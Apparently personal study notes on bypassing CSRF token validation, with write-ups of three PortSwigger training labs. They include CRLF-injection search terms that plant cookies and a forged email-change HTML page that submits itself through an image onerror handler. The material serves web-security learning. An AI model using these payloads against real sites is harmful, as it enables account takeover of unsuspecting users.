## CSRF token implementations:
#csrf-token
**CSRF Tokens:** unique, secret, and unpredictable values generated by the server-side application and shared with the client. The server should refuse to perform the requested action if the CSRF token is not included with client requests.

- Often shared via a **hidden parameter in an HTML form** that is submitted with the subsequent `POST` request, e.g.:
``` html
<form name="change-email-form" action="/my-account/change-email" method="POST">
    <label>Email</label>
    <input required type="email" name="email" value="example@normal-website.com">
    <input required type="hidden" name="csrf" value="50FaWgdOhi9M9wyna8taR1k3ODOR8d6u">
    <button class='button' type='submit'> Update email </button>
</form>
```
- Some applications **place CSRF tokens in HTTP headers** - which necessitates a different approach to circumventing.

### Bypassing CSRF token validation
Some applications may...
- Skip `CSRF` validation when **different HTTP methods are used** (`GET`)
- Skip `CSRF` validation when **tokens are omitted entirely**
- Improperly tie `CSRF` tokens to the session - and instead, **maintain a "pool" of accepted tokens** that have been previously issued - *allowing attackers to log in, obtain a valid token, and reuse it for someone else.*

Some more complex scenarios may involve when the application...

- Ties the `CSRF` token to **a cookie that's not used to track sessions**.
	- Often associated with apps employing multiple frameworks (one for session handling, one for `csrf` protection)
	- If the attacker can **set a cookie in the victim's browser** (via another vulnerability), they can **log in to own account to obtain `csrf` token + associated non-session cookie**, then place their cookie in the **victim's browser**, and **feed their token to the victim** to perform `CSRF` attacks. 
	- **Note:** this cookie-setting behaviour may not even need to be **on the same site** - depending on the cookie's scope, **any DNS domain** can be leveraged to set the malicious cookie. *E.g., a cookie-setting function on `staging.demo.normal-website.com` could be leveraged to place a cookie that is submitted to `secure.normal-website.com`.*
```  HTTP
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Cookie: session=pSJYSScWKpmC60LpFOAHKixuFuM4uXWF; csrfKey=rZHCnSzEp8dbI6atzagGoSYyqJqTz5dv

csrf=RhV7yQDO0xcq9gLEah2WVbmuFqyOq7tY&email=wiener@normal-user.com
```
- **Duplicates the CSRF token in a cookie** - to avoid maintaining server state, some apps will **duplicate each token within a cookie and a request parameter**, and check that **both are the same** when checking any request. 
	- Thus, if any cookie-setting functionality/vulnerability is possible, attacker can **invent a token in required format** (if checked), **place the `csrf` cookie in victim's browser**, and **feed their `csrf` request parameter token** to the victim in the `csrf` attack.
``` http
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Cookie: session=1DQGdzYbOJQzLP7460tfyiv3do7MjyPw; csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa

csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa&email=wiener@normal-user.com
```


#### [Lab](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-not-tied-to-user-session): Improper association of `CSRF` tokens to sessions
Through testing between two accounts, confirmed that:
- Once a `csrf` token is generated and included in the HTML of a page, it is **valid for ANY account (i.e. any user session) until used.**
	- Generated `csrf` token with peter's account, copied it and used it when logged in to carlos's account to change their email.
- Submitting **used CSRF tokens** will result in an error.
Thus, can pre-generate a `csrf` token by visiting an account page, **not use it**, and include it on a malicious page to be submitted as a `csrf` attack to change a victim's email.

Extracted carlos's `csrf` token: `aNj28EQuNQK1n1ZqtzGtf19w1RxrDXmk`
![](attachments/Bypassing%20CSRF%20Tokens.png)
Altered the email change `POST` request to include this token, and the desired email address to change it to, and delivered to victim via HTML injection/malicious webpage.
![](attachments/Bypassing%20CSRF%20Tokens-1.png)


#### [Lab](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-tied-to-non-session-cookie): CSRF where token is tied to non-session cookie
Through testing two accounts, determined that:
- The `csrfKey` cookie seems to be generated & tied to a `csrf` request parameter, and **persists across accounts**. 
	- Thus, obtaining a **valid `csrfKey` cookie + `csrf` request parameter pair**, one can perform a csrf attack.
![](attachments/Bypassing%20CSRF%20Tokens-7.png)
So, need to find a way to inject the `csrfKey` cookie into the victim's browser when making a request 

##### The cookie overflow vulnerability in search bar:
When searching the site, the last search term gets reflected into the `Set-Cookie` header, and set as a cookie. Can use this to inject a valid `csrfKey`. 
![](attachments/Bypassing%20CSRF%20Tokens-2.png)
**Initial search Term:** `hi; csrfKey=Rc3oZcuKBoyGoXEXFFLGi10Hk93C05fV`
![](attachments/Bypassing%20CSRF%20Tokens-4.png)

However, if we try and set the cookie, it gets set with `Secure; HttpOnly`, and **not as a valid cookie**. To do so, we must include a new line, and a new `Set-Cookie` directive. This involves using the URL encoded **carriage return (%0d), new line (%0a)** characters, creating:
- `test/r/nSet-Cookie: csrfKey=xxxxx; SameSite=None`
- **Url-encoded:** `test%0D%0ASet-Cookie%3a+csrfKey%3dRc3oZcuKBoyGoXEXFFLGi1sssss3C05fV%3b+SameSite%3dNone`
![](attachments/Bypassing%20CSRF%20Tokens-6.png)

Thus, to perform the csrf attack, our malicious webpage must:
- **search for this value** to **inject the `csrfKey` cookie** into the victim's browser
- perform a **subsequent request** with the browser cookies to change the victim's email, **without** visting their account page (as the `csrfKey` cookie is reset then)

To do so, can alter `csrf` POC by **removing the auto-submit script section**, and replacing it with an image **whose `src` is the malicious search term**. This will cause the victim's browser when visiting the webpage to **request that link**, set the malicious browser cookie, and then error out, **submitting the form** with the cookie & their `session` intact.
``` js
<img src="https://0a7d001e04f851d9809f1280006a00a9.web-security-academy.net/?search=test%0D%0ASet-Cookie%3a+csrfKey%3dRc3oZcuKBoyGoXEXFFLGi10Hk93C05fV%3b+SameSite%3dNone" onerror="document.forms[0].submit()">
```


#### [Lab](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-duplicated-in-cookie): CSRF where token is duplicated in cookie
- Observed that by changing the `csrf` request & `csrf` cookie to a **single-letter different value**, is accepted **as long as both match.**
- This is the same **regardless of the `session` id - so can be used across different users as long as they match & in correct format.** (later noticed not even format matters)
	- Suggests using the double-submit "csrf protection", which is insecure

Thus, need to make a page that:
- sets the `csrf` cookie to known working value
- submit an identical `csrf` request parameter.

Using the search bar again to try and inject the cookie (as the `LastSearchTerm` is set as a cookie):
`test%0D%0ASet-Cookie%3a+csrf%3dFVaJxV0jcEWh9xaMp56YklM9vv1txuiH%3b+SameSite%3dNone`
![](attachments/Bypassing%20CSRF%20Tokens-9.png)

Used this to successfully issue an email change:
![](attachments/Bypassing%20CSRF%20Tokens-10.png)

Thus, created page as follows (see previous lab:)
``` html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0ae600a40474143a80c171140068001c.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="evilmwahaha&#64;normal&#45;user&#46;net" />
      <input type="hidden" name="csrf" value="hiya" />
      <input type="submit" value="Submit request" />
    </form>
<img src="https://0ae600a40474143a80c171140068001c.web-security-academy.net/?search=test%0D%0ASet-Cookie%3a+csrf%3dhiya%3b+SameSite%3dNone" onerror="document.forms[0].submit()">
  </body>
</html>
```
